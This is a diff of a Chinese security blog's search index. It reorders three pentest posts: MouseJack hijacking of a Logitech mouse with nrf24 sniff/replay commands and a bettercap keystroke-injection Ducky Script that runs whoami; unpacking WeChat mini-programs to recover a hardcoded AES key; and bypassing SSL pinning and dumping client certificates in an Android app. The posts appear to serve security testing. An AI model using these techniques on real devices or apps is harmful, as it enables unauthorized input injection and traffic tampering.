@@ -37,6 +37,34 @@
       </categories>
   </entry>
   <entry>
+    <title>Crazyradio PA---罗技 鼠标劫持</title>
+    <url>/2021/09/24/Crazyradio%20PA---%E7%BD%97%E6%8A%80%20%E9%BC%A0%E6%A0%87%E5%8A%AB%E6%8C%81/</url>
+    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>  <a href="https://www.bettercap.org/modules/hid/">https://www.bettercap.org/modules/hid/</a><br>  <a href="https://github.com/BastilleResearch/nrf-research-firmware">https://github.com/BastilleResearch/nrf-research-firmware</a><br>  <a href="https://github.com/hak5darren">https://github.com/hak5darren</a></p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><pre><code>Atiify
+Crazyradio PA
+Logitech M186
+使用攻击脚本：https://github.com/BastilleResearch/mousejack
+            原：https://github.com/RFStorm/
+bettercap也可以不使用，但使用hid模块，通过数据传输总量有助于准确找出鼠标地址
+</code></pre>
+<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>  apt install sdcc binutils<br>  pip install pyusb<br>  pip install platformio</p>
+<h1 id="烧录（也可跳过，烧录需要usb2-0的接口）"><a href="#烧录（也可跳过，烧录需要usb2-0的接口）" class="headerlink" title="烧录（也可跳过，烧录需要usb2.0的接口）"></a>烧录（也可跳过，烧录需要usb2.0的接口）</h1><p>  git clone <a href="https://github.com/bitcraze/crazyradio-firmware">https://github.com/bitcraze/crazyradio-firmware</a><br>  cd crazyradio-firmware<br>  python usbtools/launchBootloader.py</p>
+<span id="more"></span>    
+<p>  下载固件<br>  <a href="https://github.com/bitcraze/crazyradio-firmware/releases">https://github.com/bitcraze/crazyradio-firmware/releases</a><br>  python usbtools/nrfbootload.py flash cradio-0.53.bin</p>
+<p>  lsusb命令查看<br>  id为1915:0101 或 1915:0102</p>
+<h1 id="mousejack"><a href="#mousejack" class="headerlink" title="mousejack"></a>mousejack</h1><p>  mousejack扩展工具：<a href="https://github.com/iamckn/mousejack_transmit">https://github.com/iamckn/mousejack_transmit</a></p>
+<p>  cd nrf-research-firmware/tools<br>  搜索<br>  移动鼠标发现地址<br>  sudo python nrf24-scanner.py</p>
+<p>  对特定地址进行嗅探<br>  capture.log 为固定输出文件名 </p>
+<p>  sudo ./nrf24-sniffer.py -a 0D:6C:90:B4:A4 -o capture.log<br>  sudo ./nrf24-static-channel-replay -a 0D:6C:90:B4:A4</p>
+<p>  即可重放log里的数据</p>
+<h1 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h1><p>  duck.txt编写<br>  调用terminal 执行whoami<br>  参考链接：<a href="https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language">https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language</a><br>  <a href="https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow">https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow</a><br>对于mac：<br>  GUI SPACE<br>  DELAY 1000<br>  STRING Terminal<br>  DELAY 2000<br>  ENTER<br>  DELAY 1000<br>  STRING  whoami<br>  DELAY 1000<br>  ENTER<br>  ESC<br>利用bettercap进行注入<br>hid.recon on 开启 crazy<br>hid.inject 0d:6c:90:b4:a4 US /home/iot/Desktop/mouse/mousejack_transmit/duck.txt<br>  <img src="/images/mouse/b1.png" alt="bettercap"></p>
+<p><img src="/images/mouse/b2.png" alt="调用termnial"></p>
+]]></content>
+      <categories>
+        <category>IOT</category>
+      </categories>
+  </entry>
+  <entry>
     <title>IOS—lldb基础调试</title>
     <url>/2021/10/03/IOS-lldb%E5%9F%BA%E7%A1%80%E8%B0%83%E8%AF%95/</url>
     <content><![CDATA[<h1 id="越狱手机"><a href="#越狱手机" class="headerlink" title="越狱手机"></a>越狱手机</h1><p>ps -ef | grep 进程</p>
@@ -59,6 +87,41 @@
 ]]></content>
       <categories>
         <category>IOS</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小程序安全测试--微信（1）</title>
+    <url>/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h1><pre><code>注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功
+</code></pre>
+<span id="more"></span>    
+
+<p>app端解包<br>python (<a href="https://github.com/leo9960/wechat-app-unpack">https://github.com/leo9960/wechat-app-unpack</a>)<br>nodejs 也有编译好的客户端 (<a href="https://github.com/xuedingmiaojun/mp-unpack">https://github.com/xuedingmiaojun/mp-unpack</a>)</p>
+<p>pc端解包<br>pc端可能带加密，所以需要先转码<br>(<a href="https://github.com/maotoumao/wxpc-miniprogram-decryption">https://github.com/maotoumao/wxpc-miniprogram-decryption</a>)<br>原理：<br>(<a href="https://juejin.cn/post/6888348237242040327">https://juejin.cn/post/6888348237242040327</a>)<br>(<a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a>)</p>
+<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><p>Android：<br>/data/data/com.tencent.mm/MicroMsg/32位长文件/appbrand/pkg</p>
+<p>IOS：<br>/var/mobile/Containers/Data/Application/{程序UUID}/Library/WechatPrivate/{用户ID}/WeApp/LocalCache/release/{小程序ID}/</p>
+<p>mac路径：</p>
+<p>~/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeChat/817f39087ae1fbf97dc81798419249c7/WeApp/LocalCache/release/wx3ba512d53df66a75/4/Module<br><img src="/images/mac%E8%B7%AF%E5%BE%84.png"></p>
+<p>以某球影城为例：<br>从Android复制过来4个包，一个主文件，三个子文件<br><img src="/images/%E8%A7%A3%E5%8C%85.jpg"></p>
+<p>案列一：<br>某小程序硬编码<br>aes 偏移量 密钥<br><img src="/images/phc/phc.jpg" alt="aes 偏移量 密钥"></p>
+<p>解密数据包<br>修改数据即可测试。<br><img src="/images/phc/phc2.jpg" alt="解密数据包"></p>
+]]></content>
+      <categories>
+        <category>小程序</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>某蜂app抓包分析</title>
+    <url>/2021/10/10/%E6%9F%90%E8%9C%82app%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>尝试解除flutter<br>hook java sll<br>内存dump双向认证证书<br>导入burp抓包测试</p>
+<p>1.flutter<br>参考：<a href="https://bbs.pediy.com/thread-261941.htm">https://bbs.pediy.com/thread-261941.htm</a></p>
+<p>apk解压后发现flutter的so文件<br>以为是flutter问题<br>找到字节进行hook（ida–&gt;ssl_client–&gt;x–&gt;取字节 ）<br>x 之后 add R2，pc；”ssl_clinet”</p>
+<p>2.java-ssl绕过<br>root手机配置好后进行抓包，发现不能抓<br>hook java-ssl<br>登录页面发包403显示 证书未发送</p>
+<p>3.双向认证<br>除了自己写<br>可以用工具hooker<br><a href="https://github.com/CreditTone/hooker">https://github.com/CreditTone/hooker</a><br>客户端必调java.security.KeyStore的getPrivateKey和getCertificate方法<br>hook dump证书，密码写入<br>导入 burp </p>
+<p>抓包发现逻辑漏洞。 </p>
+]]></content>
+      <categories>
+        <category>Android</category>
       </categories>
   </entry>
   <entry>
@@ -88,69 +151,6 @@
 ]]></content>
       <categories>
         <category>IOT</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Crazyradio PA---罗技 鼠标劫持</title>
-    <url>/2021/09/24/Crazyradio%20PA---%E7%BD%97%E6%8A%80%20%E9%BC%A0%E6%A0%87%E5%8A%AB%E6%8C%81/</url>
-    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>  <a href="https://www.bettercap.org/modules/hid/">https://www.bettercap.org/modules/hid/</a><br>  <a href="https://github.com/BastilleResearch/nrf-research-firmware">https://github.com/BastilleResearch/nrf-research-firmware</a><br>  <a href="https://github.com/hak5darren">https://github.com/hak5darren</a></p>
-<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><pre><code>Atiify
-Crazyradio PA
-Logitech M186
-使用攻击脚本：https://github.com/BastilleResearch/mousejack
-            原：https://github.com/RFStorm/
-bettercap也可以不使用，但使用hid模块，通过数据传输总量有助于准确找出鼠标地址
-</code></pre>
-<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>  apt install sdcc binutils<br>  pip install pyusb<br>  pip install platformio</p>
-<h1 id="烧录（也可跳过，烧录需要usb2-0的接口）"><a href="#烧录（也可跳过，烧录需要usb2-0的接口）" class="headerlink" title="烧录（也可跳过，烧录需要usb2.0的接口）"></a>烧录（也可跳过，烧录需要usb2.0的接口）</h1><p>  git clone <a href="https://github.com/bitcraze/crazyradio-firmware">https://github.com/bitcraze/crazyradio-firmware</a><br>  cd crazyradio-firmware<br>  python usbtools/launchBootloader.py</p>
-<span id="more"></span>    
-<p>  下载固件<br>  <a href="https://github.com/bitcraze/crazyradio-firmware/releases">https://github.com/bitcraze/crazyradio-firmware/releases</a><br>  python usbtools/nrfbootload.py flash cradio-0.53.bin</p>
-<p>  lsusb命令查看<br>  id为1915:0101 或 1915:0102</p>
-<h1 id="mousejack"><a href="#mousejack" class="headerlink" title="mousejack"></a>mousejack</h1><p>  mousejack扩展工具：<a href="https://github.com/iamckn/mousejack_transmit">https://github.com/iamckn/mousejack_transmit</a></p>
-<p>  cd nrf-research-firmware/tools<br>  搜索<br>  移动鼠标发现地址<br>  sudo python nrf24-scanner.py</p>
-<p>  对特定地址进行嗅探<br>  capture.log 为固定输出文件名 </p>
-<p>  sudo ./nrf24-sniffer.py -a 0D:6C:90:B4:A4 -o capture.log<br>  sudo ./nrf24-static-channel-replay -a 0D:6C:90:B4:A4</p>
-<p>  即可重放log里的数据</p>
-<h1 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h1><p>  duck.txt编写<br>  调用terminal 执行whoami<br>  参考链接：<a href="https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language">https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language</a><br>  <a href="https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow">https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow</a><br>对于mac：<br>  GUI SPACE<br>  DELAY 1000<br>  STRING Terminal<br>  DELAY 2000<br>  ENTER<br>  DELAY 1000<br>  STRING  whoami<br>  DELAY 1000<br>  ENTER<br>  ESC<br>利用bettercap进行注入<br>hid.recon on 开启 crazy<br>hid.inject 0d:6c:90:b4:a4 US /home/iot/Desktop/mouse/mousejack_transmit/duck.txt<br>  <img src="/images/mouse/b1.png" alt="bettercap"></p>
-<p><img src="/images/mouse/b2.png" alt="调用termnial"></p>
-]]></content>
-      <categories>
-        <category>IOT</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>某蜂app抓包分析</title>
-    <url>/2021/10/10/%E6%9F%90%E8%9C%82app%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>尝试解除flutter<br>hook java sll<br>内存dump双向认证证书<br>导入burp抓包测试</p>
-<p>1.flutter<br>参考：<a href="https://bbs.pediy.com/thread-261941.htm">https://bbs.pediy.com/thread-261941.htm</a></p>
-<p>apk解压后发现flutter的so文件<br>以为是flutter问题<br>找到字节进行hook（ida–&gt;ssl_client–&gt;x–&gt;取字节 ）<br>x 之后 add R2，pc；“ssl_clinet”</p>
-<p>2.java-ssl绕过<br>root手机配置好后进行抓包，发现不能抓<br>hook java-ssl<br>登录页面发包403显示 证书未发送</p>
-<p>3.双向认证<br>除了自己写<br>可以用工具hooker<br><a href="https://github.com/CreditTone/hooker">https://github.com/CreditTone/hooker</a><br>客户端必调java.security.KeyStore的getPrivateKey和getCertificate方法<br>hook dump证书，密码写入<br>导入 burp </p>
-<p>抓包发现逻辑漏洞。 </p>
-]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>小程序安全测试--微信（1）</title>
-    <url>/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h1 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h1><pre><code>注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功
-</code></pre>
-<span id="more"></span>    
-
-<p>app端解包<br>python (<a href="https://github.com/leo9960/wechat-app-unpack">https://github.com/leo9960/wechat-app-unpack</a>)<br>nodejs 也有编译好的客户端 (<a href="https://github.com/xuedingmiaojun/mp-unpack">https://github.com/xuedingmiaojun/mp-unpack</a>)</p>
-<p>pc端解包<br>pc端可能带加密，所以需要先转码<br>(<a href="https://github.com/maotoumao/wxpc-miniprogram-decryption">https://github.com/maotoumao/wxpc-miniprogram-decryption</a>)<br>原理：<br>(<a href="https://juejin.cn/post/6888348237242040327">https://juejin.cn/post/6888348237242040327</a>)<br>(<a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a>)</p>
-<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><p>Android：<br>/data/data/com.tencent.mm/MicroMsg/32位长文件/appbrand/pkg</p>
-<p>IOS：<br>/var/mobile/Containers/Data/Application/{程序UUID}/Library/WechatPrivate/{用户ID}/WeApp/LocalCache/release/{小程序ID}/</p>
-<p>mac路径：</p>
-<p>~/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeChat/817f39087ae1fbf97dc81798419249c7/WeApp/LocalCache/release/wx3ba512d53df66a75/4/Module<br><img src="/images/mac%E8%B7%AF%E5%BE%84.png"></p>
-<p>以某球影城为例：<br>从Android复制过来4个包，一个主文件，三个子文件<br><img src="/images/%E8%A7%A3%E5%8C%85.jpg"></p>
-<p>案列一：<br>某小程序硬编码<br>aes 偏移量 密钥<br><img src="/images/phc/phc.jpg" alt="aes 偏移量 密钥"></p>
-<p>解密数据包<br>修改数据即可测试。<br><img src="/images/phc/phc2.jpg" alt="解密数据包"></p>
-]]></content>
-      <categories>
-        <category>小程序</category>
       </categories>
   </entry>
 </search>
